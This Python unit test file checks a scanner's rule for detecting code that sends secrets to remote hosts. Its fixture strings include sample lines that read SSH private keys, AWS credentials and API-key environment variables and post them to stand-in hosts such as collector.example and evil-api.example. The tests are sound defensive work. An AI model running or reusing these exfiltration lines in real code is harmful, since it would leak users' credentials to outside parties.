"""Sensitive sources are modeled, never read or sent anywhere."""
import ast
import unittest
from unittest.mock import patch

import protestware_check as scanner


class SensitiveFlowTests(unittest.TestCase):
    def findings(self, source, allowed=()):
        return [item for item in scanner.scan_text('sample.py', source, [], list(allowed)) if item['rule'] == 'SENSITIVE_DATA_SEND']

    def test_sensitive_environment_reaches_http_body_through_helper(self):
        source = ('import os, requests\ndef send(value):\n    requests.post("https://collector.example/upload", json={"data": value})\n'
                  'send(os.getenv("API_KEY"))')
        result = self.findings(source)
        self.assertEqual(result[0]['severity'], 'high')
        self.assertEqual(result[0]['dataflow'][0]['kind'], 'source')
        self.assertIn('parameter', [item['kind'] for item in result[0]['dataflow']])

    def test_unknown_destination_is_medium(self):
        result = self.findings('import os, requests\nrequests.post(endpoint, data=os.environ["SECRET"])')
        self.assertEqual(result[0]['severity'], 'medium')

    def test_trusted_domain_boundary_and_query_payload(self):
        for host, expected in (('api.example', False), ('v1.api.example', False), ('evil-api.example', True)):
            source = f'import os, requests\nrequests.get("https://{host}/api", params={{"key": os.getenv("API_KEY")}})'
            self.assertEqual(bool(self.findings(source, ['api.example'])), expected)

    def test_constant_url_prefix_retains_allowed_destination(self):
        source = 'import os, requests\nrequests.get("https://api.example/path/" + os.getenv("SECRET"))'
        self.assertFalse(self.findings(source, ['api.example']))
        unsafe = 'import os, requests\nrequests.get("https://api.example" + os.getenv("SECRET"))'
        self.assertTrue(self.findings(unsafe, ['api.example']))

    def test_credential_file_read_is_only_a_source_for_known_file_methods(self):
        source = ('from pathlib import Path\nimport requests\n'
                  'value = Path("/home/demo/.ssh/id_ed25519").read_bytes()\n'
                  'requests.post("https://collector.example/upload", data=value)')
        self.assertTrue(self.findings(source))
        self.assertFalse(self.findings(source.replace('.ssh/id_ed25519', 'public.txt')))

    def test_sources_are_not_read_or_executed(self):
        source = 'import requests\nvalue = open("/home/demo/.aws/credentials").read()\nrequests.post("https://collector.example/upload", data=value)'
        with patch('builtins.open', side_effect=AssertionError('target read forbidden')):
            self.assertTrue(self.findings(source))

    def test_python_tree_is_parsed_once_for_both_analyzers(self):
        with patch.object(ast, 'parse', wraps=ast.parse) as parse:
            scanner.scan_text('sample.py', 'import os, requests\nrequests.get(os.getenv("URL"))', [], [])
        self.assertEqual(parse.call_count, 1)

    def test_constant_false_branches_and_short_circuit_do_not_send_sensitive_data(self):
        action = 'requests.post("https://collector.example/upload", data=os.getenv("SECRET"))'
        for body in ('if False:\n    ' + action, 'flag = False\nif flag:\n    ' + action,
                     'False and ' + action, 'while False:\n    ' + action,
                     'with context():\n    if False:\n        ' + action,
                     'value = False and os.getenv("SECRET")\nrequests.post("https://collector.example/upload", data=value)',
                     'value = os.getenv("SECRET") if False else "public"\nrequests.post("https://collector.example/upload", data=value)',
                     'callback = lambda: ' + action):
            with self.subTest(body=body):
                self.assertFalse(self.findings('import os, requests\n' + body))


if __name__ == '__main__':
    unittest.main()
